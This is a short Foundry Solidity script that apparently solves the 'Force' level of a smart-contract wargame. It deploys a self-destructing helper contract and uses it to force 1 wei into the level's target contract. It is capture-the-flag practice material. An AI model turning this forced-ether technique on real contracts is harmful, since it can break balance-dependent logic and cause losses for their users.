// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {Selfdestruct} from "../src/Level7.sol";

// ================================================================
// │                          LEVEL 7 - FORCE                     │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        Selfdestruct targetContract = new Selfdestruct();
        targetContract.attack{value: 1 wei}(targetContractAddress);
        vm.stopBroadcast();
    }
}
